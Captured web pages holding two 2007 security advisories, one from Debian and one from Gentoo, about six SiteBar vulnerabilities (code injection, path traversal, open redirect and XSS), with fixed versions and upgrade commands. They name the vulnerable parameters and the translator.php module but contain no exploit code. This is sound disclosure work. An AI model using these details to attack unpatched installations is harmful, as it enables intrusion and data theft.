    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?keywords=i&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?keywords=i&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from www.debian.org_5f67e2f8_20250124_161858.html ===


---

[[Date Prev](msg00203.html)][[Date Next](msg00205.html)]
[[Thread Prev](msg00203.html)][[Thread Next](msg00205.html)]
[[Date Index](maillist.html#00204)]
[[Thread Index](threads.html#00204)]

# [SECURITY] [DSA 1423-1] New sitebar packages fix several vulnerabilities

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 1423-1] New sitebar packages fix several vulnerabilities
* *From*: Steve Kemp <skx@debian.org>
* *Date*: Fri, 7 Dec 2007 18:56:32 +0000
* *Message-id*: <[[🔎]](/msgid-search/20071207185632.GA10346%40steve.org.uk) [20071207185632.GA10346@steve.org.uk](msg00204.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- ------------------------------------------------------------------------
Debian Security Advisory DSA-1423-1                  security@debian.org
<http://www.debian.org/security/>                               Steve Kemp
December 07, 2007                     <http://www.debian.org/security/faq>
- ------------------------------------------------------------------------

Package        : sitebar
Vulnerability  : various
Problem type   : remote
Debian-specific: no
CVE Id(s)      : CVE-2007-5491, CVE-2007-5492, CVE-2007-5693, CVE-2007-5694, CVE-2007-5695, CVE-2007-5692
Debian Bug     : 447135, 448690, 448689

Several remote vulnerabilities have been discovered in sitebar, a
web based bookmark manager written in PHP.  The Common Vulnerabilities
Exposures project identifies the following problems:

CVE-2007-5491
   A directory traversal vulnerability in the translation module allows
   remote authenticated users to chmod arbitrary files to 0777 via ".."
   sequences in the lang parameter.

CVE-2007-5492
   A static code injection vulnerability in the translation module allows
   a remote authenticated user to execute arbitrary PHP code via the value
   parameter.

CVE-2007-5693
   An eval injection vulnerability in the translation module allows
   remote authenticated users to execute arbitrary PHP code via the
   edit parameter in an upd cmd action.

CVE-2007-5694
   A path traversal vulnerability in the translation module allows
   remote authenticated users to read arbitrary files via an absolute
   path in the 'dir' parameter.

CVE-2007-5695
   An error in command.php allows remote attackers to redirect users
   to arbitrary web sites via the forward parameter in a Log In action.

CVE-2007-5692
   Multiple cross site scripting flaws allow remote attackers to inject
   arbitrary script or HTML fragments into several scripts.

For the stable distribution (etch), these problem have been fixed in version
3.3.8-7etch1.

For the old stable distribution (sarge), these problems have been fixed in
version 3.2.6-7.1sarge1

For the unstable distribution (sid), these problems have been fixed in version
3.3.8-12.1.

We recommend that you upgrade your sitebar package.

Upgrade instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

Debian GNU/Linux 3.1 alias sarge
- --------------------------------

Oldstable updates are available for alpha, amd64, arm, hppa, i386, ia64, m68k, mips, mipsel, powerpc, s390 and sparc.

Source archives:

  <http://security.debian.org/pool/updates/main/s/sitebar/sitebar_3.2.6-7.1sarge1.diff.gz>
    Size/MD5 checksum:    12821 c38ed9e586c8b07b23349588f2be23b2
  <http://security.debian.org/pool/updates/main/s/sitebar/sitebar_3.2.6.orig.tar.gz>
    Size/MD5 checksum:   333352 a86243f7a70a1a9ac80342fbcca14297
  <http://security.debian.org/pool/updates/main/s/sitebar/sitebar_3.2.6-7.1sarge1.dsc>
    Size/MD5 checksum:      580 7654849ce1ea822b9b70c52a98def837

Architecture independent packages:

  <http://security.debian.org/pool/updates/main/s/sitebar/sitebar_3.2.6-7.1sarge1_all.deb>
    Size/MD5 checksum:   341570 6e106cf5dddb0ee63f29efdcf93d8d74

Debian GNU/Linux 4.0 alias etch
- -------------------------------

Source archives:

  <http://security.debian.org/pool/updates/main/s/sitebar/sitebar_3.3.8-7etch1.dsc>
    Size/MD5 checksum:      583 8af7750ff9a808798bf1b898c69b84d6
  <http://security.debian.org/pool/updates/main/s/sitebar/sitebar_3.3.8-7etch1.diff.gz>
    Size/MD5 checksum:    22552 cdc186193c2ad2d4e69f220dd8372ccd
  <http://security.debian.org/pool/updates/main/s/sitebar/sitebar_3.3.8.orig.tar.gz>
    Size/MD5 checksum:   686944 fa7b5367808966c8db6241f475f3ef2f

Architecture independent packages:

  <http://security.debian.org/pool/updates/main/s/sitebar/sitebar_3.3.8-7etch1_all.deb>
    Size/MD5 checksum:   709524 16eb8791acea7cf1c99ac61b7b47e4b1

  These files will probably be moved into the stable distribution on
  its next update.

- ---------------------------------------------------------------------------------
For apt-get: deb <http://security.debian.org/> stable/updates main
For dpkg-ftp: ftp://security.debian.org/debian-security dists/stable/updates/main
Mailing list: debian-security-announce@lists.debian.org
Package info: `apt-cache show <pkg>' and <http://packages.debian.org/><pkg>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)

iD4DBQFHWZclwM/Gs81MDZ0RAhwvAJY5qk56jr8xBSSoGonFR/T0hl0wAJ9ONcOq
DVImtWUfKE4M1Ed/0yF1oQ==
=PCk5
-----END PGP SIGNATURE-----

```

---



=== Content from www.gentoo.org_ed75320a_20250124_161859.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# SiteBar: Multiple issues — GLSA **200711-05**

Multiple issues have been identified in SiteBar that might allow execution
of arbitrary code and arbitrary file disclosure.

### Affected packages

| Package | **www-apps/sitebar** on all architectures |
| --- | --- |
| Affected versions | < **3.3.9** |
| Unaffected versions | >= **3.3.9** |

### Background

SiteBar is a PHP application that allows users to store their bookmarks
on a web server.

### Description

Tim Brown discovered these multiple issues: the translation module does
not properly sanitize the value to the "dir" parameter (CVE-2007-5491,
CVE-2007-5694); the translation module also does not sanitize the
values of the "edit" and "value" parameters which it passes to eval()
and include() (CVE-2007-5492, CVE-2007-5693); the log-in command does
not validate the URL to redirect users to after logging in
(CVE-2007-5695); SiteBar also contains several cross-site scripting
vulnerabilities (CVE-2007-5692).

### Impact

An authenticated attacker in the "Translators" or "Admins" group could
execute arbitrary code, read arbitrary files and possibly change their
permissions with the privileges of the user running the web server by
passing a specially crafted parameter string to the "translator.php"
file. An unauthenticated attacker could entice a user to browse a
specially crafted URL, allowing for the execution of script code in the
context of the user's browser, for the theft of browser credentials or
for a redirection to an arbitrary web site after login.

### Workaround

There is no known workaround at this time.

### Resolution

All SiteBar users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-apps/sitebar-3.3.9"
```
### References

* [CVE-2007-5491](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5491)
* [CVE-2007-5492](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5492)
* [CVE-2007-5692](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5692)
* [CVE-2007-5693](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5693)
* [CVE-2007-5694](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5694)
* [CVE-2007-5695](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5695)

**Release date**

November 06, 2007

**Latest revision**

November 06, 2007: 01

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [195810](https://bugs.gentoo.org/show_bug.cgi?id=195810)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**


